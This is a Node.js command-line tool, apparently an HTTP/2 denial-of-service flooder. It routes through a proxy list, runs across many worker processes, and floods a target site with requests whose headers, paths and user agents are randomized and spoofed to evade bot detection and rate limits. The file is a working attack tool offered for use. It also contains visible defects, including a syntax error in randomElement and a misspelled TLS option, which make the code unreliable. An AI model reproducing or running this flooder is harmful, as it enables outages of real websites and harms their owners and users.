const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const fs = require('fs');
const UserAgent = require('user-agents');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
  console.log(`Usage: target time rate thread proxyfile`);
  process.exit();
}

function readLines(filePath) {
  return fs.readFileSync(filePath, 'utf-8').split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length);
}

function randstr(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let res = '';
  for (let i = 0; i < length; i++) res += chars[randomIntn(0, chars.length)];
  return res;
}

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6]
};

const sig = [
  'ecdsa_secp256r1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
  'hmac_sha256',
  'ecdsa_secp384r1_sha384',
  'rsa_pkcs1_sha1',
  'hmac_sha1'
];

const acceptHeader = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'application/json',
  'application/xml',
  'application/pdf',
  'text/css',
  'application/javascript'
];

const langHeader = [
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'en-ZA',
  'fr-FR',
  'ja-JP',
  'ar-EG',
  'de-DE',
  'es-ES'
];

const encodingHeader = [
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'identity',
  'compress',
  'br'
];

const methods = ['GET', 'HEAD', 'POST', 'PATCH', 'DELETE'];
const cacheControl = ['max-age=0', 'no-cache', 'no-store', 'must-revalidate'];
const secChUa = [
  '"Chromium";v="127", "Not)A;Brand";v="99"',
  '"Google Chrome";v="127", "Chromium";v="127", "Not)A;Brand";v="99"',
  '"Microsoft Edge";v="127", "Chromium";v="127", "Not)A;Brand";v="99"'
];
const secChUaPlatform = ['Linux', 'Windows', 'macOS', 'Android', 'iOS'];
const rateHeaders = [
  () => ({ 'akamai-origin-hop': randstr(12) }),
  () => ({ 'proxy-client-ip': randstr(12) }),
  () => ({ via: randstr(12) }),
  () => ({ 'cluster-ip': randstr(12) }),
  () => ({ 'user-agent': randstr(12) })
];

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let i = 0; i < args.threads; i++) cluster.fork();
  console.clear();
  console.log('\x1b[1m\x1b[34mTarget: \x1b[0m\x1b[1m' + parsedTarget.host + '\x1b[0m');
  console.log('\x1b[1m\x1b[33mDuration: \x1b[0m\x1b[1m' + args.time + '\x1b[0m');
  console.log('\x1b[1m\x1b[32mThreads: \x1b[0m\x1b[1m' + args.threads + '\x1b[0m');
  console.log('\x1b[1m\x1b[31mRequests per second: \x1b[0m\x1b[1m' + args.rate + '\x1b[0m');
} else {
  setInterval(runFlooder);
}

class NetSocket {
  http(options, callback) {
    const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const conn = net.connect({ host: options.host, port: options.port, noDelay: true });
    conn.setTimeout(options.timeout * 100000);
    conn.setKeepAlive(true, 100000);
    conn.on('connect', () => conn.write(payload));
    conn.on('data', chunk => {
      if (!chunk.toString('utf-8').includes('HTTP/1.1 200')) {
        conn.destroy();
        return callback(undefined, 'error: invalid response from proxy server');
      }
      callback(conn, undefined);
    });
    conn.on('timeout', () => {
      conn.destroy();
      callback(undefined, 'error: timeout exceeded');
    });
    conn.on('error', err => {
      conn.destroy();
      callback(undefined, 'error: ' + err);
    });
  }
}

function generateUserAgent() {
  return new UserAgent({
    deviceCategory: randomElement(['desktop', 'mobile', 'tablet']),
    platform: randomElement(['Win32', 'MacIntel', 'Linux x86_64', 'iPhone', 'Android'])
  }).toString();
}

const socket = new NetSocket();

function buildDynamicHeaders() {
  const base = {
    ':method': randomElement(methods),
    ':authority': parsedTarget.host,
    ':path': parsedTarget.path + '?' + randstr(10) + '=' + randstr(5),
    ':scheme': 'https',
    'user-agent': generateUserAgent(),
    accept: randomElement(acceptHeader),
    'accept-encoding': randomElement(encodingHeader),
    'accept-language': randomElement(langHeader),
    'cache-control': randomElement(cacheControl),
    'sec-ch-ua': randomElement(secChUa),
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': randomElement(secChUaPlatform),
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'x-requested-with': 'XMLHttpRequest'
  };
  const dynamic = randomElement(rateHeaders)();
  return { ...base, ...dynamic };
}

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const [host, portStr] = proxyAddr.split(':');
  const port = ~~portStr;
  const proxyOptions = { host, port, address: parsedTarget.host + ':443', timeout: 15 };
  socket.http(proxyOptions, (conn, err) => {
    if (err) return conn && conn.destroy();
    const tlsOptions = {
      secure: true,
      ALPNProtocols: ['h2'],
      sigals: randomElement(sig),
      socket: conn,
      ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
      ecdhCurve: 'P-256:P-384',
      host: parsedTarget.host,
      servername: parsedTarget.host,
      rejectUnauthorized: false,
      secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
        crypto.constants.SSL_OP_NO_TICKET |
        crypto.constants.SSL_OP_NO_COMPRESSION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
        crypto.constants.SSL_OP_NO_RENEGOTIATION |
        crypto.constants.SSL_OP_SINGLE_DH_USE |
        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
        crypto.constants.SSL_OP_NO_QUERY_MTU
    };
    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsConn.setKeepAlive(true, 60000);
    const client = http2.connect(parsedTarget.href, {
      protocol: 'https:',
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 50000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 65536,
        enablePush: false
      },
      createConnection: () => tlsConn
    });
    client.on('connect', () => {
      const interval = setInterval(() => {
        for (let i = 0; i < args.rate; i++) {
          const headers = buildDynamicHeaders();
          const req = client.request(headers);
          req.on('response', () => {
            req.close();
            req.destroy();
          });
          req.end();
        }
      }, 250);
    });
    client.on('close', () => client.destroy());
  });
}

setTimeout(() => process.exit(1), args.time * 1000);
